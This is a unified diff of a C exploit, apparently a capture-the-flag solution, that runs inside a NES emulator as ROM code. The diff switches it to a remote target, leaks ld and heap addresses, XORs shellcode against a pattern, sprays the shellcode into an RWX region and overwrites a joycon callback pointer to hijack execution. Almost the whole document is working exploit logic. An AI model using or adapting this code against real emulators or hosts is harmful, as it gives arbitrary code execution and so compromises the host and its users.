@@ -2,31 +2,30 @@
 
 extern void bka(uint8_t a);
 extern void bkx(uint8_t a);
+extern void nop();
 
-//#define REMOTE
+#define REMOTE
 
 #define HEAP_LIBC_PAGE 0x4
 #define HEAP_LIBC_OFF 0x1E50
 
 #ifdef REMOTE
 #define LD_PAGE 0x1
-#define DREAM_OFF 0x3f3000
+#define DREAM_OFF XDOFFSET
 #endif
 #ifndef REMOTE
 #define DREAM_OFF 0xA2D60
 //0xA8000
 #define LD_PAGE 0x1
 #endif
-#define LD_OFF 0x3f0
+#define LD_OFF 0x3c8
 #define HEAP_OFF 0x3d0
 #define RWX_OFF 0x3000
 #define LIBC_OFF 0x217000
 #define SYSTEM_OFF 0x28670
 #define FUNC_OVERWRITE_OFF 0x3FB108
-#define M_RAM_OFF 0x553e0
+#define M_RAM_OFF 0x55440
 #define JOYCON_CB_RWX_DIFF 0x62D79
-#define SHELLCODE_SZ 0x4a
-#define SPRAY_CNT 3
 
 enum IORegisters
 {
@@ -131,11 +130,11 @@ uint8_t get_data(uint16_t addr){
 }
 
 
-//void set_ppu_data(uint8_t chef){
-//    *(uint8_t*)PPUDATA = chef;
-//}
-//
-//uint8_t libc_addr[8];
+void set_ppu_data(uint8_t chef){
+    *(uint8_t*)PPUDATA = chef;
+}
+
+uint8_t libc_addr[8];
 
 void leak(uint16_t offset, uint32_t* high, uint32_t* low){
     uint8_t i = 0;
@@ -168,48 +167,58 @@ void dump(uint32_t base){
     xorAt(base+0xff, 0);
 }
 
-void debug(){
-    while(1) *(uint8_t*)JOY1 = 1;
-}
-
 int main(void) {
     uint32_t rwx_low, rwx_high;
     uint32_t mram_low, mram_high;
+//    uint32_t libc_low, libc_high;
     uint32_t mram_rwx_off_low, mram_rwx_off_high;
     uint32_t joycon_cb_fn_low, overwrite;
     uint8_t i,j;
 
-    //debug();
+    //set different CHR page
+    //xorAt64(DREAM_OFF+0x1c, 0, HEAP_LIBC_PAGE);
 
-    xorAt64(DREAM_OFF+0x1c, 0, LD_PAGE & 0xff);
+    //leak(HEAP_LIBC_OFF, &libc_high, &libc_low);
 
-    //for finding Mapper allocation on blind remote
-#ifdef DUMP
+
+    //log64(libc_high, libc_low);
+
+    //libc_low -= LIBC_OFF //compute base address
+    //xorAt64(DREAM_OFF+0x1c, 0, HEAP_LIBC_PAGE); //reset the one page
+    xorAt64(DREAM_OFF+0x1c, 0, LD_PAGE & 0xff); //reset the one page
+    //xorAt64(DREAM_OFF+0x1d, 0, (LD_PAGE>>8) & 0xff); //reset the one page
     putchar(0x44);
     putchar(0x44);
-    for(i = 0; i < 8; i++)
-        dump(DREAM_OFF + i*0x100);
+    dump(DREAM_OFF);
+    dump(DREAM_OFF + 0x100);
+    dump(DREAM_OFF + 0x200);
+    dump(DREAM_OFF + 0x300);
+    dump(DREAM_OFF + 0x400);
+    dump(DREAM_OFF + 0x500);
+    dump(DREAM_OFF + 0x600);
+    dump(DREAM_OFF + 0x700);
     putchar(0x45);
     putchar(0x45);
-#endif
+    
 
     rwx_low = rwx_high = 0;
     leak(LD_OFF, &rwx_high, &rwx_low);
-    rwx_low -= RWX_OFF;
-    rwx_low &= 0xFFFFFF00;
+    //rwx_low -= RWX_OFF;
+    //rwx_low &= 0xFFFFFF00;
+    log64(rwx_high, rwx_low);
 
     mram_low = mram_high = 0;
     leak(HEAP_OFF, &mram_high, &mram_low);
     mram_low -= M_RAM_OFF; //set the heap leak to m_RAM
+    mram_high |= 0x5500; //fucking alignment problems
 
-    log64(rwx_high, rwx_low);
     log64(mram_high, mram_low);
 
     sub64(rwx_low, rwx_high, mram_low, mram_high, &mram_rwx_off_low, &mram_rwx_off_high);
     log64(mram_rwx_off_high, mram_rwx_off_low);
 
     //prep shellcode with the pattern found at rwx section
-    for(i = 0; i < SHELLCODE_SZ; i++)
+    for(i = 0; i < 0x4a; i++)
         shellcode[i] ^= pattern[i%0x10];
 
     
@@ -217,17 +226,19 @@ int main(void) {
     for(i = 0; i < 0x10; i++)
         pattern[i] ^= 0x90;
 
-    for(j = 0; j < SPRAY_CNT;j++){
+    for(j = 0; j < 0x3;j++){
         for(i = 0; i < 0xb0; i++){
             xorAt64(mram_rwx_off_low+i, mram_rwx_off_high, pattern[i%0x10]);
         }
         mram_rwx_off_low+= 0xb0;
             //write shellcode
-        for(i = 0; i < SHELLCODE_SZ; i++)
+        for(i = 0; i < 0x4a; i++)
             xorAt64(mram_rwx_off_low+i, mram_rwx_off_high, shellcode[i]);
         mram_rwx_off_low += 0x50;
     }
-    mram_rwx_off_low -= SPRAY_CNT*0x100;
+    mram_rwx_off_low -= 0x300;
+    reset();
+    reset();
 
     //overwrite callback function
     overwrite = rwx_low;
